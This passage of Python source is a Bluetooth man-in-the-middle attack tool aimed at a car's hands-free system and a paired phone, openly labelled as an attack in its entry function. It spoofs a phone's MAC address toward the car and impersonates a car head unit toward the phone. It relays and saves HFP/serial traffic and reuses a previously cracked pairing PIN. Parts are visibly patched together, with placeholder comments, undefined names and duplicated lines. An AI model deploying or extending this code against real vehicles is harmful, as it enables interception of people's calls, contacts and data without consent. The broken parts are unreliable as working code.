                ready_to_read, _, _ = select.select([car_dev], [], [], 0.1)
                
                if car_dev in ready_to_read:
                    data = car_dev.read(buffer_size)
                    
                    if not data:
                        print(f"[INFO] Car device disconnected for {service_name}")
                        break
                    
                    # Log and save the data
                    print(f"[DATA] {service_name} car→phone: {len(data)} bytes")
                    save_captured_data(data, service_name, "car_to_phone", session_dir)
                    
                    # Send to phone
                    phone_sock.sendall(data)
                
                time.sleep(0.01)  # Small sleep to prevent CPU spinning
                
            except Exception as e:
                print(f"[ERROR] Error in car→phone proxy for {service_name}: {e}")
                break
    except Exception as e:
        print(f"[ERROR] Fatal error in car→phone proxy for {service_name}: {e}")
    finally:
        print(f"[INFO] car→phone proxy for {service_name} terminated")

def proxy_data_socket_to_device(phone_sock, car_dev, service_name, session_dir):
    """Proxy data from a socket to a device file"""
    print(f"[INFO] Starting phone→car proxy for {service_name}...")
    
    try:
        buffer_size = 1024
        phone_sock.settimeout(0.1)
        
        while running:
            try:
                # Try to read from the socket
                data = phone_sock.recv(buffer_size)
                
                if not data:
                    print(f"[INFO] Phone disconnected for {service_name}")
                    break
                
                # Log and save the data
                print(f"[DATA] {service_name} phone→car: {len(data)} bytes")
                save_captured_data(data, service_name, "phone_to_car", session_dir)
                
                # Special handling for HFP commands if needed
                if service_name == 'HFP':
                    # After establishing the RFCOMM connection, explicitly set up SCO
                    try:
                        # Configure SCO socket for voice calls 
                        subprocess.run(["sudo", "hcitool", "cmd", "0x01", "0x0029", car_mac.replace(":", ""), "00", "00"], check=False)
                        time.sleep(1)
                        # Also try direct SCO connection
                        subprocess.run(["sudo", "hcitool", "sco", car_mac], check=False)
                        time.sleep(1)
                    except Exception as e:
                        print(f"[WARN] SCO setup error: {e}")
                    
                    # Write to the car device
                    car_dev.write(data)
                    car_dev.flush()
            except socket.timeout:
                # Expected timeout
                continue
    finally:
        print(f"[INFO] phone→car proxy for {service_name} terminated")
    print(f"[INFO] phone→car proxy for {service_name} terminated")

def signal_handler(sig, frame):
    global running
    print("\n[INFO] Shutting down...")
    running = False
    
    # Shutdown and cleanup
    try:
        # Close all sockets
        for sock in all_sockets:
            try:
                sock.close()
            except Exception as e:
                print(f"[DEBUG] Error closing socket: {e}")
        
        # Close server sockets specifically
        for service_name, service_info in phone_services.items():
            try:
                # Close server socket
                if 'server' in service_info:
                    service_info['server'].close()
                
                # Close car socket
                if 'car_sock' in service_info:
                    service_info['car_sock'].close()
                
                # Close client socket
                if 'client_sock' in service_info:
                    service_info['client_sock'].close()
            except Exception as e:
                print(f"[DEBUG] Error closing {service_name} sockets: {e}")
        
        # Release any rfcomm bindings
        for i in range(5):  # Release rfcomm0-4
            subprocess.run(f"sudo rfcomm release {i}", shell=True, check=False)
        
        # Join threads with timeout
        for thread in all_threads:
            try:
                thread.join(timeout=1)
            except Exception as e:
                print(f"[DEBUG] Error joining thread: {e}")
        
        # Restart bluetooth service
        subprocess.run(["sudo", "systemctl", "restart", "bluetooth"], check=False)
        print("[INFO] Bluetooth service restarted")
        
    except Exception as e:
        print(f"[ERROR] Error during shutdown: {e}")
        
    print("[INFO] MitM session terminated")
    sys.exit(0)

def connect_to_hfp_with_dbus(car_mac):
    """Connect to car HFP using D-Bus API with proper manager initialization"""
    try:
        # Initialize D-Bus
        bus = dbus.SystemBus()
        
        # The critical fix - properly initialize the manager
        manager = dbus.Interface(
            bus.get_object("org.bluez", "/"),
            "org.freedesktop.DBus.ObjectManager"
        )
        
        # Get device path
        device_path = None
        objects = manager.GetManagedObjects()
        for path, interfaces in objects.items():
            if "org.bluez.Device1" in interfaces:
                props = dbus.Interface(
                    bus.get_object("org.bluez", path),
                    "org.freedesktop.DBus.Properties"
                )
                try:
                    addr = props.Get("org.bluez.Device1", "Address")
                    if addr == car_mac:
                        device_path = path
                        print(f"[DEBUG] Found device at path: {device_path}")
                        break
                except:
                    continue
        
        if not device_path:
            print(f"[ERROR] Device {car_mac} not found in BlueZ objects")
            return None
        
        # Get the device object and interface
        device = dbus.Interface(
            bus.get_object("org.bluez", device_path),
            "org.bluez.Device1"
        )
        
        # Force connection
        try:
            device.Connect()
            print("[DEBUG] D-Bus Connect called successfully")
        except dbus.exceptions.DBusException as e:
            if "AlreadyConnected" in str(e):
                print("[DEBUG] Device already connected")
            else:
                print(f"[WARN] D-Bus Connect error: {e}")
        
        # This section is critical - manually create RFCOMM binding
        try:
            # Force create RFCOMM
            subprocess.run(f"sudo rfcomm release 0", shell=True, check=False)
            time.sleep(1)
            bind_cmd = f"sudo rfcomm bind 0 {car_mac} 1 -A"
            subprocess.run(bind_cmd, shell=True, check=True)
            
            if os.path.exists("/dev/rfcomm0"):
                print("[DEBUG] Successfully created RFCOMM binding")
            else:
                print("[WARN] Failed to create RFCOMM device")
        except Exception as e:
            print(f"[WARN] RFCOMM binding error: {e}")
        
        # Configure HFP profile
        try:
            for path, interfaces in objects.items():
                if device_path in path and "org.bluez.MediaTransport1" in interfaces:
                    transport = dbus.Interface(
                        bus.get_object("org.bluez", path),
                        "org.bluez.MediaTransport1"
                    )
                    print(f"[DEBUG] Found MediaTransport at {path}")
                    
                    # Also set via PulseAudio for better compatibility
                    device_addr = car_mac.replace(":", "_") 
                    subprocess.run(f"pactl set-card-profile bluez_card.{device_addr} handsfree_head_unit", 
                                 shell=True, check=False)
                    
                    return {"device": device, "path": device_path}
            
            # No transport found, try direct profile selection
            profile_cmd = f"echo -e 'connect {car_mac}\\nselect-profile handsfree_head_unit\\nquit' | bluetoothctl"
            subprocess.run(profile_cmd, shell=True, check=False)
            print("[DEBUG] Selected HFP profile using bluetoothctl")
            
            return {"device": device, "path": device_path}
        except Exception as e:
            print(f"[WARN] Profile selection error: {e}")
            return {"device": device, "path": device_path}
    except Exception as e:
        print(f"[ERROR] D-Bus HFP connection failed: {e}")
        return None

def connect_to_car_simple(car_mac, channel, service_name=None):
    """Simple direct socket connection to car with improved HFP handling"""
    print(f"[INFO] Connecting to car on channel {channel}...")
    
    # Special handling for HFP - use channel 1 specifically
    if service_name == 'HFP':
        print(f"[INFO] Using specialized HFP connection approach")
        
        # First try the D-Bus approach (most reliable for HFP)
        dbus_handler = connect_to_hfp_with_dbus(car_mac)
        if dbus_handler:
            return dbus_handler
        
        
        try:
            # Force bind a different rfcomm device to avoid conflicts
            # Use channel 20+ to avoid conflicts with existing devices
            device_num = 25
            
            # Force clean release
            subprocess.run(f"sudo rfcomm release {device_num} || true", shell=True, check=False)
            time.sleep(1)
            
            # Bind with non-blocking I/O
            bind_cmd = f"sudo rfcomm bind {device_num} {car_mac} 1"
            result = subprocess.run(bind_cmd, shell=True, capture_output=True, text=True)
            time.sleep(2)
            
            if os.path.exists(f"/dev/rfcomm{device_num}"):
                print(f"[INFO] Connected to HFP via rfcomm{device_num}")
                
                # Create a wrapper class that works like a socket
                class RFCOMMFileWrapper:
                    def __init__(self, device_path):
                        self.device_path = device_path
                        self.file = open(device_path, 'r+b', buffering=0)
                        self.device_num = device_num
                        self.is_mock = False
                        
                    def recv(self, bufsize):
                        try:
                            ready, _, _ = select.select([self.file], [], [], 0.1)
                            if ready:
                                return self.file.read(bufsize)
                            return b''
                        except Exception as e:
                            print(f"[DEBUG] Error reading HFP: {e}")
                            return b''
                        
                    def send(self, data):
                        try:
                            self.file.write(data)
                            self.file.flush()
                            return len(data)
                        except Exception as e:
                            print(f"[DEBUG] Error writing HFP: {e}")
                            return 0
                        
                    def close(self):
                        try:
                            self.file.close()
                            subprocess.run(f"sudo rfcomm release {self.device_num}", shell=True, check=False)
                        except:
                            pass
                
                try:
                    # Try to open the device non-blocking with direct file operations
                    fd = os.open(f"/dev/rfcomm{device_num}", os.O_RDWR | os.O_NONBLOCK)
                    device_file = os.fdopen(fd, 'r+b', buffering=0)
                    print(f"[INFO] Opened /dev/rfcomm{device_num} for HFP")
                    return RFCOMMFileWrapper(f"/dev/rfcomm{device_num}")
                except Exception as e:
                    print(f"[WARN] Error opening rfcomm device: {e}")
            else:
                print(f"[WARN] Device not created after rfcomm bind")
        except Exception as e:
            print(f"[WARN] Error with rfcomm approach: {e}")
        
        # If all else fails, use the enhanced mock handler
        print(f"[INFO] Creating enhanced mock HFP handler")
        
        class EnhancedMockHFPHandler:
            def __init__(self):
                self.is_mock = True
                self.at_commands = {
                    'AT+BRSF=': '+BRSF: 1023\r\nOK\r\n',  # Supported features
                    'AT+CIND=?': '+CIND: ("call",(0,1)),("callsetup",(0-3)),("service",(0-1)),("signal",(0-5)),("roam",(0-1)),("battchg",(0-5)),("callheld",(0-2))\r\nOK\r\n',
                    'AT+CIND?': '+CIND: 0,0,1,5,0,5,0\r\nOK\r\n',  # Status indicators
                    'AT+CMER=': 'OK\r\n',  # Event reporting
                    'AT+CHLD=?': '+CHLD: (0,1,2,3,4)\r\nOK\r\n',  # Call handling options
                    'AT+CLIP=': 'OK\r\n',  # Calling line identification
                    'AT+VGS=': 'OK\r\n',  # Volume control
                    'AT+VGM=': 'OK\r\n',  # Microphone volume
                    'ATD': 'OK\r\n\r\n+CIEV: 3,1\r\n+CIEV: 2,1\r\n',
                    'AT+CHUP': 'OK\r\n\r\n+CIEV: 2,0\r\n',  # Hang up
                    'ATA': 'OK\r\n\r\n+CIEV: 3,1\r\n+CIEV: 2,1\r\n', 
                    'AT+BLDN': 'OK\r\n',   # Last number redial
                    'AT+BVRA=': 'OK\r\n',  # Voice recognition
                    'AT+BINP=': '+BINP: "123456789"\r\nOK\r\n',  # Phone number request
                    'AT+BAC=': 'OK\r\n',   # Bluetooth Available Codecs
                    'AT+BCC': 'OK\r\n',    # Bluetooth Codec Connection
                    'AT+BCS=': 'OK\r\n',   # Bluetooth Codec Selection
                }
                
            def recv(self, bufsize):
                time.sleep(0.1)
                return b''
                
            def send(self, data):
                try:
                    # Parse the data as an AT command
                    command = data.decode('utf-8', errors='ignore').strip()
                    print(f"[MOCK-HFP] Command: {command}")
                    
                    # Look for matching command in our dictionary
                    for cmd, response in self.at_commands.items():
                        if command.startswith(cmd):
                            print(f"[MOCK-HFP] Responding: {response.strip()}")
                            return len(data)
                    
                    # Default to OK
                    print(f"[MOCK-HFP] Default OK response")
                    return len(data)
                except Exception as e:
                    print(f"[MOCK-HFP] Error: {e}")
                    return 0
                
            def close(self):
                print("[MOCK-HFP] Close called")
        
        return EnhancedMockHFPHandler()
    
    # For non-HFP services, use the existing approach
    # ... rest of the existing function ...


def advertise_service(server_sock, service_uuid, channel, service_name):
    """Advertise a Bluetooth service with multiple fallback methods"""
    try:
        print(f"[INFO] Advertising {service_name} on channel {channel}")
        
        # Try native PyBluez advertisement
        try:
            bluetooth.advertise_service(
                server_sock,
                service_name,
                service_id=service_uuid,
                service_classes=[service_uuid, bluetooth.SERIAL_PORT_CLASS],
                profiles=[bluetooth.SERIAL_PORT_PROFILE]
            )
            print(f"[INFO] Registered {service_name} using bluetooth.advertise_service")
            return True
        except Exception as e:
            print(f"[WARN] Error with advertise_service: {e}, trying sdptool...")
            
        # Try sdptool as fallback
        try:
            subprocess.run([
                "sudo", "sdptool", "add", "--channel", str(channel),
                "HF"
            ], check=False)
            print(f"[INFO] Registered {service_name} service using sdptool")
            return True
        except Exception as e2:
            print(f"[WARN] Error with sdptool: {e2}, trying simplified...")
            
        # Try simplified sdptool command as last resort
        try:
            subprocess.run(["sudo", "sdptool", "add", "SP"], check=False)
            print(f"[INFO] Registered basic SP service with simplified sdptool command")
            return True
        except Exception as e3:
            print(f"[ERROR] All service advertisement methods failed: {e3}")
            return False
    except Exception as e:
        print(f"[ERROR] Error advertising service: {e}")
        return False




def proxy_service(service_name, car_mac, car_channel, phone_service_uuid=None):
    """Set up a proxy service with improved HFP handling"""
    global all_sockets, all_threads, phone_services, running, session_dir
    
    print(f"[INFO] Setting up proxy for {service_name} service")
    
    # Set up UUIDs based on service type
    if service_name == 'HFP':
        # Force create RFCOMM binding for HFP on channel 1
        device_num = 0  # Use device 0 for HFP
        try:
            # Release first to ensure clean binding
            subprocess.run(f"sudo rfcomm release {device_num}", shell=True, check=False)
            time.sleep(1)
            
            # Force bind with correct parameters
            bind_cmd = f"sudo rfcomm bind {device_num} {car_mac} {car_channel} -A"
            bind_result = subprocess.run(bind_cmd, shell=True, capture_output=True, text=True)
            
            if os.path.exists(f"/dev/rfcomm{device_num}"):
                print(f"[INFO] Successfully created /dev/rfcomm{device_num} for HFP")
            else:
                print(f"[WARN] Failed to create RFCOMM device: {bind_result.stderr}")
        except Exception as e:
            print(f"[WARN] RFCOMM bind error: {e}")
        
        # Enhanced HFP service advertisement
        advertise_hfp_service(car_channel)
        
        # Also set up general phone compatibility
        setup_hfp_for_phone()
        service_uuid = HFP_UUID
    elif service_name == 'SPP':
        service_uuid = SPP_UUID
    elif service_name == 'HSP': 
        service_uuid = HSP_UUID
    else:
        service_uuid = SPP_UUID  # Default to SPP
    
    # Rest of function remains the same...
    # Connect to car service
    car_sock = connect_to_car_simple(car_mac, car_channel, service_name)
    if not car_sock:
        print(f"[ERROR] Could not connect to car's {service_name} service - skipping")
        return False
    
    # Check if we got a mock socket (for HFP)
    is_mock = hasattr(car_sock, 'is_mock') and car_sock.is_mock
    if is_mock:
        print(f"[INFO] Using {'mock' if is_mock else 'real'} {service_name} handler for car connection")
    
    all_sockets.append(car_sock)
    
    # Step 2: Create server for phone to connect to (with retries for HFP)
    max_retries = 3
    server_sock = None
    
    for attempt in range(max_retries):
        try:
            print(f"[INFO] Creating server socket for {service_name} (attempt {attempt+1}/{max_retries})")
            
            # Create socket
            server = BluetoothSocket(RFCOMM)
            server.bind(("", car_channel))
            server.listen(1)
            
            # Advertise service
            print(f"[INFO] Advertising {service_name} on channel {car_channel}")
            
            try:
                # Try PyBluez advertise_service first
                bluetooth.advertise_service(
                    server, 
                    service_name,
                    service_id=service_uuid,
                    service_classes=[service_uuid]
                )
                print(f"[INFO] Registered {service_name} using bluetooth.advertise_service")
                server_sock = server
                break
            except Exception as e:
                print(f"[WARN] Error with advertise_service: {e}, trying sdptool...")
                
                # Determine the correct service type for sdptool
                if service_name == 'HFP':
                    sdp_type = "HF"
                elif service_name == 'HSP':
                    sdp_type = "HS"
                else:
                    sdp_type = "SP"
                
                # Use sdptool as fallback
                try:
                    cmd = f"sudo sdptool add --channel={car_channel} {sdp_type}"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        print(f"[INFO] Registered {service_name} service using sdptool")
                        server_sock = server
                        break
                    else:
                        print(f"[WARN] sdptool error: {result.stderr}")
                        
                        # Last resort - try simplified sdptool
                        cmd = f"sudo sdptool add SP"
                        result = subprocess.run(cmd, shell=True, check=False)
                        print(f"[INFO] Attempted basic SP registration with sdptool")
                        server_sock = server
                        break
                except Exception as e2:
                    print(f"[ERROR] All service advertisement methods failed: {e2}")
                    server.close()
                    
                    # If this is the last attempt, return failure
                    if attempt == max_retries - 1:
                        return False
                    
                    # Otherwise wait and retry
                    time.sleep(2 * (attempt + 1))
        except Exception as e:
            print(f"[ERROR] Error creating server for {service_name}: {e}")
            
            # If this is the last attempt, return failure
            if attempt == max_retries - 1:
                return False
                
            # Otherwise wait and retry
            time.sleep(2 * (attempt + 1))
    
    if not server_sock:
        print(f"[ERROR] Could not create server for {service_name} service - skipping")
        car_sock.close()
        return False
        
    all_sockets.append(server_sock)
    
    # Store in tracking dictionary
    phone_services[service_name] = {
        'server': server_sock,
        'channel': car_channel,
        'uuid': service_uuid,
        'car_sock': car_sock,
        'car_channel': car_channel,
        'is_mock': is_mock
    }
    
    # Step 3: Wait for phone to connect in a separate thread
    def wait_for_phone():
        try:
            print(f"[INFO] Waiting for phone to connect to {service_name}...")
            server_sock.settimeout(60)  # 60 second timeout
            
            try:
                client_sock, client_info = server_sock.accept()
                print(f"[INFO] Phone connected to {service_name} from {client_info}")
                all_sockets.append(client_sock)
                
                # Store the client socket
                phone_services[service_name]['client_sock'] = client_sock
                
                # Special handling for HFP - improved for full audio and call handling
                if service_name == 'HFP':
                    print(f"[INFO] Setting up specialized {service_name} handler...")
                    
                    # For HFP, configure audio profile immediately
                    if not is_mock:
                        try:
                            # Try to set up the HFP audio profile using PulseAudio
                            print("[INFO] Configuring HFP audio profile")
                            
                            # Try to set up SCO audio channel for HFP
                            try:
                                subprocess.run(["sudo", "hcitool", "sco", car_mac], 
                                             check=False, capture_output=True)
                                print("[INFO] SCO connection requested for HFP audio")
                            except Exception as e:
                                print(f"[WARN] SCO setup error: {e}")
                                
                            # Try to set the audio profile via PulseAudio
                            device_addr = car_mac.replace(":", "_")
                            card_cmd = f"pactl list cards | grep bluez_card.{device_addr}"
                            card_result = subprocess.run(card_cmd, shell=True, check=False, 
                                                      capture_output=True, text=True)
                            
                            if "bluez_card" in card_result.stdout:
                                profile_cmd = f"pactl set-card-profile bluez_card.{device_addr} handsfree_head_unit"
                                subprocess.run(profile_cmd, shell=True, check=False)
                                print("[INFO] Set PulseAudio card profile to handsfree_head_unit")
                                
                                # Also set it as default sink
                                sink_cmd = f"pactl set-default-sink bluez_sink.{device_addr}.handsfree_head_unit"
                                subprocess.run(sink_cmd, shell=True, check=False)
                                print("[INFO] Set PulseAudio default sink to handsfree_head_unit")
                            else:
                                print("[WARN] BlueTooth card not found in PulseAudio")
                        except Exception as e:
                            print(f"[WARN] Error setting up HFP audio: {e}")
                    
                    # Thread to handle phone HFP commands with improved AT handling
                    def handle_phone_hfp():
                        try:
                            client_sock.settimeout(0.1)
                            
                            # Track call state for better emulation
                            call_active = False
                            call_setup = 0  # 0=idle, 1=incoming, 2=outgoing, 3=alerting
                            command_buffer = b''
                            
                            while running:
                                try:
                                    data = client_sock.recv(1024)
                                    if not data:
                                        print(f"[INFO] Phone disconnected from {service_name}")
                                        break
                                    
                                    # Process HFP command from phone
                                    try:
                                        # Accumulate data into command buffer
                                        command_buffer += data
                                        
                                        # Process if we have a complete command
                                        if b'\r' in command_buffer:
                                            # Extract command and clear buffer
                                            command = command_buffer.decode('utf-8', errors='ignore').strip()
                                            command_buffer = b''
                                            
                                            print(f"[{service_name}] Phone sent: {command}")
                                            
                                            # Forward command to car (real or mock)
                                            car_sock.send(data)
                                            
                                            # Track call state changes
                                            if command.startswith('ATD'):
                                                call_setup = 2  # outgoing call
                                                print(f"[HFP] Outgoing call detected")
                                                
                                                # Make sure SCO is connected for audio
                                                try:
                                                    subprocess.run(["sudo", "hcitool", "sco", car_mac], 
                                                                 check=False, capture_output=True)
                                                except:
                                                    pass
                                                    
                                            elif command.startswith('AT+CHUP'):
                                                call_active = False
                                                call_setup = 0
                                                print(f"[HFP] Call hang-up detected")
                                            
                                            # If it's a mock handler, generate appropriate response manually
                                            if is_mock:
                                                # Enhanced AT command handling
                                                if command.startswith('AT+BRSF='):
                                                    # Support all features (incl. codec negotiation - bit 5)
                                                    client_sock.send(b'+BRSF: 1031\r\nOK\r\n')
                                                    
                                                    # Send indicators proactively
                                                    time.sleep(0.1)
                                                    client_sock.send(b'+CIND: ("call",(0,1)),("callsetup",(0-3)),("service",(0-1)),("signal",(0-5)),("roam",(0-1)),("battchg",(0-5)),("callheld",(0-2))\r\nOK\r\n')
                                                
                                                elif command.startswith('AT+CIND=?'):
                                                    client_sock.send(b'+CIND: ("call",(0,1)),("callsetup",(0-3)),("service",(0-1)),("signal",(0-5)),("roam",(0-1)),("battchg",(0-5)),("callheld",(0-2))\r\nOK\r\n')
                                                
                                                elif command.startswith('AT+CIND?'):
                                                    # Report current call status
                                                    call_status = 1 if call_active else 0
                                                    client_sock.send(f'+CIND: {call_status},{call_setup},1,5,0,5,0\r\nOK\r\n'.encode())
                                                
                                                elif command.startswith('AT+CMER='):
                                                    client_sock.send(b'OK\r\n')
                                                    
                                                    # After enabling event reporting, send initial indicators
                                                    time.sleep(0.1)
                                                    client_sock.send(b'+CIEV: 1,0\r\n+CIEV: 2,0\r\n+CIEV: 3,1\r\n')
                                                
                                                elif command.startswith('AT+BAC='):
                                                    # Bluetooth Available Codecs (support wideband audio)
                                                    client_sock.send(b'OK\r\n')
                                                
                                                elif command.startswith('AT+BCS='):
                                                    # Bluetooth Codec Selection (accept any codec)
                                                    client_sock.send(b'OK\r\n')
                                                    
                                                    # Try to request SCO connection after codec selection
                                                    try:
                                                        subprocess.run(["sudo", "hcitool", "sco", car_mac], 
                                                                     check=False, capture_output=True)
                                                    except:
                                                        pass
                                                
                                                elif command.startswith('AT+BCC'):
                                                    # Bluetooth Codec Connection
                                                    client_sock.send(b'OK\r\n')
                                                else:
                                                    # Generic OK for other commands
                                                    client_sock.send(b'OK\r\n')
                                        
                                    except Exception as e:
                                        print(f"[ERROR] Error handling {service_name} command: {e}")
                                        # Try to send a generic OK if parsing fails
                                        try:
                                            client_sock.send(b'OK\r\n')
                                        except:
                                            pass
                                        
                                except socket.timeout:
                                    # Expected timeout - continue loop
                                    continue
                                except Exception as e:
                                    print(f"[ERROR] Error reading from phone: {e}")
                                    break
                        except Exception as e:
                            print(f"[ERROR] Fatal error in {service_name} handler: {e}")
                    
                    hfp_thread = threading.Thread(target=handle_phone_hfp, daemon=True)
                    hfp_thread.start()
                    all_threads.append(hfp_thread)
                    print(f"[INFO] Specialized {service_name} handler started")
                else:
                    # For real connections or non-HFP, use direct forwarder
                    forwarder_threads = direct_data_forwarder(car_sock, client_sock, service_name)
                    all_threads.extend(forwarder_threads)
                    print(f"[INFO] {service_name} proxy running with direct forwarder")
                
            except socket.timeout:
                print(f"[WARN] Timeout waiting for phone to connect to {service_name}")
            except Exception as e:
                print(f"[ERROR] Error accepting connection: {e}")
                
        except Exception as e:
            print(f"[ERROR] Proxy wait thread error: {e}")
            
    # Start wait thread
    wait_thread = threading.Thread(target=wait_for_phone, daemon=True)
    wait_thread.start()
    all_threads.append(wait_thread)
    
    return True



def setup_adapters(car_adapter, phone_adapter):
    """Set up both adapters under a single BlueZ instance"""
    print(f"[INFO] Setting up adapters {car_adapter} and {phone_adapter}...")
    
    try:
        # Stop bluetoothd to prevent interference
        subprocess.run("sudo systemctl stop bluetooth", shell=True, check=False)
        time.sleep(2)
        
        # Start a single bluetoothd instance with both adapters
        subprocess.run(f"sudo bluetoothd -n -d {car_adapter},{phone_adapter}", 
                     shell=True, check=False)
        time.sleep(3)
        
        # Configure adapters
        subprocess.run(f"sudo hciconfig {car_adapter} up", shell=True, check=True)
        subprocess.run(f"sudo hciconfig {phone_adapter} up", shell=True, check=True)
        
        # Set appropriate classes and names
        subprocess.run(f"sudo hciconfig {phone_adapter} name 'Car-System'", shell=True, check=False)
        subprocess.run(f"sudo hciconfig {phone_adapter} class 0x240420", shell=True, check=False)
        
        print("[INFO] Adapters set up successfully")
        return True
    except Exception as e:
        print(f"[ERROR] Adapter setup failed: {e}")
        return False

def direct_data_forwarder(car_sock, phone_sock, service_name):
    """Directly forward data between two sockets in both directions"""
    print(f"[INFO] Starting direct forwarder for {service_name}")
    
    # Create a dedicated thread for each direction
    def forward_car_to_phone():
        try:
            car_sock.settimeout(0.1)
            while running:
                try:
                    data = car_sock.recv(1024)
                    if not data:
                        print(f"[INFO] Car disconnected from {service_name}")
                        break
                    
                    # Log what we received from the car
                    print(f"[DATA] Car→Phone {service_name}: {len(data)} bytes")
                    
                    # Debug: print actual data in hex
                    print(f"[HEX] Car→Phone: {data.hex()}")
                    
                    # Forward to phone
                    phone_sock.send(data)
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[ERROR] Car→Phone forwarding error: {e}")
                    break
        except Exception as e:
            print(f"[ERROR] Car→Phone forwarder crashed: {e}")
    
    def forward_phone_to_car():
        try:
            phone_sock.settimeout(0.1)
            while running:
                try:
                    data = phone_sock.recv(1024)
                    if not data:
                        print(f"[INFO] Phone disconnected from {service_name}")
                        break
                    
                    # Log what we received from the phone
                    print(f"[DATA] Phone→Car {service_name}: {len(data)} bytes")
                    
                    # Debug: print actual data in hex
                    print(f"[HEX] Phone→Car: {data.hex()}")
                    
                    # Forward to car
                    car_sock.send(data)
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[ERROR] Phone→Car forwarding error: {e}")
                    break
        except Exception as e:
            print(f"[ERROR] Phone→Car forwarder crashed: {e}")
    
    # Start both forwarder threads
    car_to_phone = threading.Thread(target=forward_car_to_phone, daemon=True)
    phone_to_car = threading.Thread(target=forward_phone_to_car, daemon=True)
    
    car_to_phone.start()
    phone_to_car.start()
    
    # Return the threads so we can join them later
    return [car_to_phone, phone_to_car]


# Add after the other new functions
def analyze_bluetooth_status():
    """Analyze the current state of Bluetooth connections and resources"""
    print("\n[DIAGNOSTIC] Analyzing Bluetooth status...")
    
    try:
        # Check hci adapters
        hci_status = subprocess.run("hciconfig -a", shell=True, capture_output=True, text=True)
        print(f"[DIAGNOSTIC] HCI Adapter Status:\n{hci_status.stdout}")
        
        # Check active connections
        connections = subprocess.run("hcitool con", shell=True, capture_output=True, text=True)
        print(f"[DIAGNOSTIC] Active connections:\n{connections.stdout or 'None'}")
        
        # Check RFCOMM resources
        rfcomm_status = subprocess.run("rfcomm -a", shell=True, capture_output=True, text=True)
        print(f"[DIAGNOSTIC] RFCOMM Status:\n{rfcomm_status.stdout or 'No RFCOMM bindings'}")
        
        # Check if resources are locked
        lsof_check = subprocess.run("lsof | grep -i bluetooth", shell=True, capture_output=True, text=True)
        print(f"[DIAGNOSTIC] Bluetooth resource usage:\n{lsof_check.stdout or 'No locked Bluetooth resources'}")
        
        # Check if any rfcomm devices exist
        rfcomm_devices = subprocess.run("ls -l /dev/rfcomm*", shell=True, capture_output=True, text=True)
        if rfcomm_devices.returncode == 0:
            print(f"[DIAGNOSTIC] RFCOMM devices:\n{rfcomm_devices.stdout}")
        else:
            print("[DIAGNOSTIC] No RFCOMM devices exist")
        
        # Check for bound HFP services
        sdptool_check = subprocess.run("sdptool browse local | grep -A 10 Hands-Free", shell=True, capture_output=True, text=True)
        print(f"[DIAGNOSTIC] Local HFP services:\n{sdptool_check.stdout or 'No local HFP services'}")
        
        print("[DIAGNOSTIC] Bluetooth analysis complete\n")
        return True
    except Exception as e:
        print(f"[DIAGNOSTIC] Error during Bluetooth analysis: {e}")
        return False


def proxy_bluetooth(car_mac, car_channel, phone_channel):
    # Connect to car via socket on hci1
    car_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    car_sock.bind((hci1_address, 0))  # Bind to hci1
    car_sock.connect((car_mac, car_channel))
    
    # Create server socket on hci0
    server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    server_sock.bind((hci0_address, phone_channel))
    server_sock.listen(1)
    
    # Advertise service on hci0
    bluetooth.advertise_service(server_sock, "Hands-Free", service_id=HFP_UUID)
    
    # Wait for phone connection
    print("Waiting for phone connection...")
    phone_sock, client_info = server_sock.accept()
    
    # Start forwarding between car_sock and phone_sock
    threading.Thread(target=forward_data, args=(car_sock, phone_sock)).start()
    threading.Thread(target=forward_data, args=(phone_sock, car_sock)).start()

# Add after analyze_bluetooth_status
def start_monitoring_thread():
    """Start a background thread to monitor Bluetooth status periodically"""
    def monitor_loop():
        interval = 30  # Check every 30 seconds
        while running:
            try:
                time.sleep(interval)
                if running:  # Check again in case shutdown occurred during sleep
                    analyze_bluetooth_status()
            except Exception as e:
                print(f"[MONITOR] Error in monitoring thread: {e}")
                
    monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
    monitor_thread.start()
    all_threads.append(monitor_thread)
    print("[INFO] Started Bluetooth monitoring thread")

# MITM ENTRY CODE 
def mitm_entry(car_mac, interface):
    """
    Run Bluetooth Man-in-the-Middle attack between car and phone
    
    Args:
        car_mac: MAC address of the target car
        interface: Interface to use (though we'll use both hci0 and hci1)
    """
    # Global declarations at the beginning
    global current_pin, all_sockets, all_threads, phone_connections, phone_services, running, session_dir
    # Initialize all global variables properly
    all_sockets = []
    all_threads = []
    wait_threads = []
    phone_connections = {}
    phone_services = {}
    running = True
    
    # Connection settings constants
    MAX_CONNECTION_RETRIES = 5
    CONNECTION_TIMEOUT = 10
    
    # Define our interfaces and addresses
    CAR_CONNECT_ADAPTER = "hci1"    # Adapter that will spoof phone and connect TO car
    PHONE_WAIT_ADAPTER = "hci0"     # Adapter that will wait for real phone to connect
    PHONE_MAC = "6C:55:63:33:4A:EB" # MAC we're spoofing to the car
    reset_bluetooth_environment()

    # Service UUIDs
    SPP_UUID = "00001101-0000-1000-8000-00805f9b34fb"  # Serial Port Profile
    PBAP_UUID = "0000112f-0000-1000-8000-00805f9b34fb"  # Phone Book Access Profile
    HFP_UUID = "0000111e-0000-1000-8000-00805f9b34fb"   # Hands-Free Profile
    AVRCP_UUID = "0000110e-0000-1000-8000-00805f9b34fb" # Audio/Video Remote Control Profile
    
    logger.info(f"Starting Bluetooth MitM attack targeting car: {car_mac}")
    print(f"\n[+] BLUETOOTH MAN-IN-THE-MIDDLE ATTACK")
    print(f"[+] Target car MAC: {car_mac}")
    
    # Create directory for captured traffic
    capture_dir = "bt_captures"
    os.makedirs(capture_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_dir = os.path.join(capture_dir, f"session_{timestamp}")
    os.makedirs(session_dir, exist_ok=True)
    setup_phone_emulation("hci1")  # For car connection
    setup_car_emulation("hci0")    # For phone connection
    # Load successful PIN
    successful_pin = None
    try:
        if os.path.exists("successful_pin.txt"):
            with open("successful_pin.txt", "r") as f:
                successful_pin = f.read().strip()
                logger.info(f"Loaded PIN: {successful_pin}")
                print(f"[*] Using previously successful PIN: {successful_pin}")
                
                # Set current_pin from successful_pin
                if successful_pin and successful_pin.isdigit():
                    current_pin = int(successful_pin)
                    print(f"[*] Set current PIN to: {current_pin}")
    except Exception as e:
        logger.error(f"Error loading PIN: {e}")
    
    # PHASE 1: ADAPTER ISOLATION
